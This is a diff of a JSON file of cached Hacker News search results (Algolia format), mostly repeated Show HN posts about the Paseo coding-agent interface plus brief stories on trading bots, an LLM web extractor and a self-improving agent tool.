+          "story_text": "Hey HN, I&#x27;m Mo. I&#x27;m building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there&#x27;s a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn&#x27;t talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don&#x27;t step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I&#x27;d say that with discipline it&#x27;s doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it&#x27;s holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I&#x27;m already using it to experiment with loops and agent teams, although it&#x27;s still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you&#x27;re locked onto their models. Most other alternatives I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that&#x27;s all you need. But you can also `npm install -g @getpaseo&#x2F;cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo</a><p>Homepage: <a href=\"https:&#x2F;&#x2F;paseo.sh&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;paseo.sh&#x2F;</a><p>Discord: <a href=\"https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH\" rel=\"nofollow\">https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!<p>---<p>I resubmitted this post because I forgot to add the URL and it didn&#x27;t allow me to add it later.",
+          "title": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)",
+          "updated_at": "2026-03-26T13:23:50Z",
+          "url": "https://github.com/getpaseo/paseo"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "boudra"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "Hey HN, I'm Mo. I'm building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there's a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn't talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don't step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to <em>bot</em>h native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I'd say that with discipline it's doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it's holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I'm already using it to experiment with loops and agent teams, although it's still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you're locked onto their models. Most other alternatives I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that's all you need. But you can also `npm install -g @getpaseo/cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https://github.com/getpaseo/paseo\" rel=\"nofollow\">https://github.com/getpaseo/paseo</a><p>Homepage: <a href=\"https://paseo.sh/\" rel=\"nofollow\">https://paseo.sh/</a><p>Discord: <a href=\"https://discord.gg/jz8T2uahpH\" rel=\"nofollow\">https://discord.gg/jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!"
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_boudra",
+            "story_47529963",
+            "show_hn"
+          ],
+          "author": "boudra",
+          "children": [
+            47530049
+          ],
+          "created_at": "2026-03-26T13:06:06Z",
+          "created_at_i": 1774530366,
+          "num_comments": 1,
+          "objectID": "47529963",
+          "points": 3,
+          "story_id": 47529963,
+          "story_text": "Hey HN, I&#x27;m Mo. I&#x27;m building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there&#x27;s a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn&#x27;t talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don&#x27;t step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I&#x27;d say that with discipline it&#x27;s doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it&#x27;s holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I&#x27;m already using it to experiment with loops and agent teams, although it&#x27;s still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you&#x27;re locked onto their models. Most other alternatives I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that&#x27;s all you need. But you can also `npm install -g @getpaseo&#x2F;cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo</a><p>Homepage: <a href=\"https:&#x2F;&#x2F;paseo.sh&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;paseo.sh&#x2F;</a><p>Discord: <a href=\"https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH\" rel=\"nofollow\">https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!",
+          "title": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)",
+          "updated_at": "2026-03-26T13:15:35Z"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "RuslanPoptsov"
+            },
+            "title": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "GodFin – an LSTM trading <em>bot</em> and the prediction bias problem"
+            },
+            "url": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "https://godfinapp.com"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_RuslanPoptsov",
+            "story_47529929"
+          ],
+          "author": "RuslanPoptsov",
+          "children": [
+            47529930
+          ],
+          "created_at": "2026-03-26T13:02:29Z",
+          "created_at_i": 1774530149,
+          "num_comments": 0,
+          "objectID": "47529929",
+          "points": 1,
+          "story_id": 47529929,
+          "title": "GodFin – an LSTM trading bot and the prediction bias problem",
+          "updated_at": "2026-03-26T13:04:50Z",
+          "url": "https://godfinapp.com"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "simonpure"
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "AI Coding Assistants Haven't Sped Up Delivery"
+            },
+            "url": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "https://www.infoq.com/news/2026/03/agoda-ai-code-<em>bot</em>tleneck/"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_simonpure",
+            "story_47529439"
+          ],
+          "author": "simonpure",
+          "created_at": "2026-03-26T12:03:24Z",
+          "created_at_i": 1774526604,
+          "num_comments": 0,
+          "objectID": "47529439",
+          "points": 3,
+          "story_id": 47529439,
+          "title": "AI Coding Assistants Haven't Sped Up Delivery",
+          "updated_at": "2026-03-26T12:36:03Z",
+          "url": "https://www.infoq.com/news/2026/03/agoda-ai-code-bottleneck/"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
               "value": "Anonasty"
             },
             "title": {
@@ -879,204 +992,6 @@
           "title": "Russian botnet operator linked to major ransomware attacks sentenced in US",
           "updated_at": "2026-03-26T08:09:32Z",
           "url": "https://therecord.media/russian-botnet-operator-sentenced-ransomware"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "MoritzWall"
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "OpenAI backs AI \"<em>bot</em> army\" startup Isara ($94M, $650M valuation)"
-            },
-            "url": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "https://www.wsj.com/tech/ai/openai-backs-new-ai-startup-seeking-<em>bot</em>-army-breakthroughs-a0b1fedc"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_MoritzWall",
-            "story_47526621"
-          ],
-          "author": "MoritzWall",
-          "children": [
-            47526627,
-            47526836
-          ],
-          "created_at": "2026-03-26T04:23:42Z",
-          "created_at_i": 1774499022,
-          "num_comments": 2,
-          "objectID": "47526621",
-          "points": 3,
-          "story_id": 47526621,
-          "title": "OpenAI backs AI \"bot army\" startup Isara ($94M, $650M valuation)",
-          "updated_at": "2026-03-26T05:43:17Z",
-          "url": "https://www.wsj.com/tech/ai/openai-backs-new-ai-startup-seeking-bot-army-breakthroughs-a0b1fedc"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "andrew_zhong"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "We've been building data pipelines that scrape websites and extract structured data for a while now. If you've done this, you know the drill: you write CSS selectors, the site changes its layout, everything breaks at 2am, and you spend your morning rewriting parsers.<p>LLMs seemed like the obvious fix — just throw the HTML at GPT and ask for JSON. Except in practice, it's more painful than that:<p>- Raw HTML is full of nav bars, footers, and tracking junk that eats your token budget. A typical product page is 80% noise.\n- LLMs return malformed JSON more often than you'd expect, especially with nested arrays and complex schemas. One bad bracket and your pipeline crashes.\n- Relative URLs, markdown-escaped links, tracking parameters — the &quot;small&quot; URL issues compound fast when you're processing thousands of pages.\n- You end up writing the same boilerplate: HTML cleanup → markdown conversion → LLM call → JSON parsing → error recovery → schema validation. Over and over.<p>We got tired of rebuilding this stack for every project, so we extracted it into a library.<p>Lightfeed Extractor is a TypeScript library that handles the full pipeline from raw HTML to validated, structured data:<p>- Converts HTML to LLM-ready markdown with main content extraction (strips nav, headers, footers), optional image inclusion, and URL cleaning\n- Works with any LangChain-compatible LLM (OpenAI, Gemini, Claude, Ollama, etc.)\n- Uses Zod schemas for type-safe extraction with real validation\n- Recovers partial data from malformed LLM output instead of failing entirely — if 19 out of 20 products parsed correctly, you get those 19\n- Built-in browser automation via Playwright (local, serverless, or remote) with anti-<em>bot</em> patches\n- Pairs with our browser agent (@lightfeed/browser-agent) for AI-driven page navigation before extraction<p>We use this ourselves in production at Lightfeed, and it's been solid enough that we decided to open-source it.<p>GitHub: <a href=\"https://github.com/lightfeed/extractor\" rel=\"nofollow\">https://github.com/lightfeed/extractor</a> npm: npm install @lightfeed/extractor Apache 2.0 licensed.<p>Happy to answer questions or hear feedback."
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "Show HN: Robust LLM Extractor for Websites in TypeScript"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://github.com/lightfeed/extractor"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_andrew_zhong",
-            "story_47526486",
-            "show_hn",
-            "front_page"
-          ],
-          "author": "andrew_zhong",
-          "children": [
-            47528428,
-            47526977,
-            47526820,
-            47527749,
-            47528197,
-            47528370,
-            47526760,
-            47527053,
-            47527286,
-            47526911,
-            47528608,
-            47527431,
-            47526830,
-            47527069,
-            47527218,
-            47526690
-          ],
-          "created_at": "2026-03-26T03:55:52Z",
-          "created_at_i": 1774497352,
-          "num_comments": 33,
-          "objectID": "47526486",
-          "points": 47,
-          "story_id": 47526486,
-          "story_text": "We&#x27;ve been building data pipelines that scrape websites and extract structured data for a while now. If you&#x27;ve done this, you know the drill: you write CSS selectors, the site changes its layout, everything breaks at 2am, and you spend your morning rewriting parsers.<p>LLMs seemed like the obvious fix — just throw the HTML at GPT and ask for JSON. Except in practice, it&#x27;s more painful than that:<p>- Raw HTML is full of nav bars, footers, and tracking junk that eats your token budget. A typical product page is 80% noise.\n- LLMs return malformed JSON more often than you&#x27;d expect, especially with nested arrays and complex schemas. One bad bracket and your pipeline crashes.\n- Relative URLs, markdown-escaped links, tracking parameters — the &quot;small&quot; URL issues compound fast when you&#x27;re processing thousands of pages.\n- You end up writing the same boilerplate: HTML cleanup → markdown conversion → LLM call → JSON parsing → error recovery → schema validation. Over and over.<p>We got tired of rebuilding this stack for every project, so we extracted it into a library.<p>Lightfeed Extractor is a TypeScript library that handles the full pipeline from raw HTML to validated, structured data:<p>- Converts HTML to LLM-ready markdown with main content extraction (strips nav, headers, footers), optional image inclusion, and URL cleaning\n- Works with any LangChain-compatible LLM (OpenAI, Gemini, Claude, Ollama, etc.)\n- Uses Zod schemas for type-safe extraction with real validation\n- Recovers partial data from malformed LLM output instead of failing entirely — if 19 out of 20 products parsed correctly, you get those 19\n- Built-in browser automation via Playwright (local, serverless, or remote) with anti-bot patches\n- Pairs with our browser agent (@lightfeed&#x2F;browser-agent) for AI-driven page navigation before extraction<p>We use this ourselves in production at Lightfeed, and it&#x27;s been solid enough that we decided to open-source it.<p>GitHub: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;lightfeed&#x2F;extractor\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;lightfeed&#x2F;extractor</a> npm: npm install @lightfeed&#x2F;extractor Apache 2.0 licensed.<p>Happy to answer questions or hear feedback.",
-          "title": "Show HN: Robust LLM Extractor for Websites in TypeScript",
-          "updated_at": "2026-03-26T11:27:34Z",
-          "url": "https://github.com/lightfeed/extractor"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "isaacsight"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "I built <em>kbot</em> — a terminal AI agent that learns from every session and forges new tools when it hits problems it can't solve.<p>What makes it different: Self-improving (Bayesian skill routing gets smarter over time). Tool forging (encounters a gap, builds a tool, tool persists forever). Self-defense (HMAC memory integrity, prompt injection detection). 368 tools, 41 agents, 19 local models. Fully offline, $0. Dream mode (improves itself while idle). MIT licensed.<p>Demo of <em>kbot</em> forging a tool in 30 seconds: <a href=\"https://raw.githubusercontent.com/isaacsight/kernel/main/tools/video-assets/demo-forge-real.gif\" rel=\"nofollow\">https://raw.githubusercontent.com/isaacsight/kernel/main/too...</a><p>npm install -g @kernel.chat/<em>kbot</em>"
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "Show HN: <em>Kbot</em> – AI agent that forges its own tools at runtime (MIT, $0)"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://github.com/isaacsight/kernel"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_isaacsight",
-            "story_47526475",
-            "show_hn"
-          ],
-          "author": "isaacsight",
-          "created_at": "2026-03-26T03:54:19Z",
-          "created_at_i": 1774497259,
-          "num_comments": 0,
-          "objectID": "47526475",
-          "points": 1,
-          "story_id": 47526475,
-          "story_text": "I built kbot — a terminal AI agent that learns from every session and forges new tools when it hits problems it can&#x27;t solve.<p>What makes it different: Self-improving (Bayesian skill routing gets smarter over time). Tool forging (encounters a gap, builds a tool, tool persists forever). Self-defense (HMAC memory integrity, prompt injection detection). 368 tools, 41 agents, 19 local models. Fully offline, $0. Dream mode (improves itself while idle). MIT licensed.<p>Demo of kbot forging a tool in 30 seconds: <a href=\"https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;isaacsight&#x2F;kernel&#x2F;main&#x2F;tools&#x2F;video-assets&#x2F;demo-forge-real.gif\" rel=\"nofollow\">https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;isaacsight&#x2F;kernel&#x2F;main&#x2F;too...</a><p>npm install -g @kernel.chat&#x2F;kbot",
-          "title": "Show HN: Kbot – AI agent that forges its own tools at runtime (MIT, $0)",
-          "updated_at": "2026-03-26T04:39:32Z",
-          "url": "https://github.com/isaacsight/kernel"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "pejmanjohn"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "The Million Dollar Homepage (2005) let anyone buy pixels on a webpage via Paypal plus emailing your image to the site owner. Million Dollar <em>Bot</em> Page is the same idea, except every purchase and placement is made by an AI agent.<p>Payments use MPP (Machine Payment Protocol) by Tempo x Stripe. The API returns a 402 with a WWW-Authenticate header, the agent's MPP client negotiates payment automatically, and retries the request. The agent can also generate images for you and our server validates before accepting. Whole thing works without a human in the loop."
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "Show HN: The Million Dollar Homepage, but for AI Agents"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://milliondollarbotpage.com/"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_pejmanjohn",
-            "story_47526438",
-            "show_hn"
-          ],
-          "author": "pejmanjohn",
-          "created_at": "2026-03-26T03:47:52Z",
-          "created_at_i": 1774496872,
-          "num_comments": 0,
-          "objectID": "47526438",
-          "points": 1,
-          "story_id": 47526438,
-          "story_text": "The Million Dollar Homepage (2005) let anyone buy pixels on a webpage via Paypal plus emailing your image to the site owner. Million Dollar Bot Page is the same idea, except every purchase and placement is made by an AI agent.<p>Payments use MPP (Machine Payment Protocol) by Tempo x Stripe. The API returns a 402 with a WWW-Authenticate header, the agent&#x27;s MPP client negotiates payment automatically, and retries the request. The agent can also generate images for you and our server validates before accepting. Whole thing works without a human in the loop.",
-          "title": "Show HN: The Million Dollar Homepage, but for AI Agents",
-          "updated_at": "2026-03-26T04:39:32Z",
-          "url": "https://milliondollarbotpage.com/"
         }
       ]
     },
@@ -1319,6 +1234,95 @@
             "author": {
               "matchLevel": "none",
               "matchedWords": [],
+              "value": "boudra"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "claude",
+                "code",
+                "alternative"
+              ],
+              "value": "Hey HN, I'm Mo. I'm building Paseo, a multi-platform interface for running <em>Claude</em> <em>Code</em>, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there's a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for <em>Claude</em> <em>Code</em>. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn't talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don't step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I'd say that with discipline it's doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it's holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I'm already using it to experiment with loops and agent teams, although it's still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (<em>Claude</em> <em>Code</em> Remote Control, Codex app, etc.), but with mixed quality and you're locked onto their models. Most other <em>alternatives</em> I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that's all you need. But you can also `npm install -g @getpaseo/cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https://github.com/getpaseo/paseo\" rel=\"nofollow\">https://github.com/getpaseo/paseo</a><p>Homepage: <a href=\"https://paseo.sh/\" rel=\"nofollow\">https://paseo.sh/</a><p>Discord: <a href=\"https://discord.gg/jz8T2uahpH\" rel=\"nofollow\">https://discord.gg/jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!<p>---<p>I resubmitted this post because I forgot to add the URL and it didn't allow me to add it later."
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)"
+            },
+            "url": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "https://github.com/getpaseo/paseo"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_boudra",
+            "story_47530027",
+            "show_hn"
+          ],
+          "author": "boudra",
+          "created_at": "2026-03-26T13:11:34Z",
+          "created_at_i": 1774530694,
+          "num_comments": 0,
+          "objectID": "47530027",
+          "points": 4,
+          "story_id": 47530027,
+          "story_text": "Hey HN, I&#x27;m Mo. I&#x27;m building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there&#x27;s a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn&#x27;t talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don&#x27;t step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I&#x27;d say that with discipline it&#x27;s doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it&#x27;s holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I&#x27;m already using it to experiment with loops and agent teams, although it&#x27;s still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you&#x27;re locked onto their models. Most other alternatives I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that&#x27;s all you need. But you can also `npm install -g @getpaseo&#x2F;cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo</a><p>Homepage: <a href=\"https:&#x2F;&#x2F;paseo.sh&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;paseo.sh&#x2F;</a><p>Discord: <a href=\"https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH\" rel=\"nofollow\">https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!<p>---<p>I resubmitted this post because I forgot to add the URL and it didn&#x27;t allow me to add it later.",
+          "title": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)",
+          "updated_at": "2026-03-26T13:23:50Z",
+          "url": "https://github.com/getpaseo/paseo"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "boudra"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "claude",
+                "code",
+                "alternative"
+              ],
